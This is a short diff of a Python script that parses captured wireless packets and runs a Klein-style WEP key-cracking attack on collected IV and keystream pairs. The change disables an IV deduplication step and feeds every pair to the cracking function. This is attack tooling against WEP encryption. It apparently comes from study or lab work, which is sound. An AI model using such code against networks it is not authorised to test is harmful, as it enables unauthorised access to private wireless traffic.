@@ -41,27 +41,33 @@ from pathlib import Path
 iv_stream_pair = []
 iv_stream_pair = iv_stream_pair + parse_pcap("output-05.cap")
 iv_stream_pair = iv_stream_pair + parse_pcap("output-03.cap")
-	
-uniques = set()
-i=0
-unique_iv_stream_pair = []
-for iv in iv_stream_pair:
-	tmpiv=iv.get('iv')
-	setlen=len(uniques)
-	uniques.add(str(tmpiv))
-	if setlen == len(uniques):
-		unique_iv_stream_pair.append(iv)
-	i+=1
-	print('\r{}'.format(i), end="", flush=True)
-print(" packages contained {} unique pairs".format(len(uniques)))
-tuple_amount = 50000 #len(uniques)
+
+#try to remove duplicate ivs
+if False:
+	uniques = set()
+	i=0
+	unique_iv_stream_pair = []
+	for iv in iv_stream_pair:
+		tmpiv=iv.get('iv')
+		setlen=len(uniques)
+		uniques.add(str(tmpiv))
+		if setlen == len(uniques):
+			unique_iv_stream_pair.append(iv)
+		i+=1
+		print('\r{}'.format(i), end="", flush=True)
+	print(" packages contained {} unique pairs".format(len(unique_iv_stream_pair)))
+
+	tuple_amount = len(unique_iv_stream_pair)
+	iv_stream_pair = unique_iv_stream_pair
+else:
+	tuple_amount = len(iv_stream_pair)
 
 log("Key Stream collected after {}ms".format(int((datetime.datetime.now() - start).total_seconds() * 1000)),
     level=0)
 
 # Crack wep by approximating main key bytes from (iv, stream cipher) pairs
 log("Start Hacking {} ms".format(int((datetime.datetime.now() - start).total_seconds() * 1000)), level=0)
-possible_key = klein_attack.crack_wep(unique_iv_stream_pair, key_length_bytes, n, tuple_amount)
+possible_key = klein_attack.crack_wep(iv_stream_pair, key_length_bytes, n, tuple_amount)
 
 ms_end = int((datetime.datetime.now() - start).total_seconds() * 1000)
 s_end = int((datetime.datetime.now() - start).total_seconds())
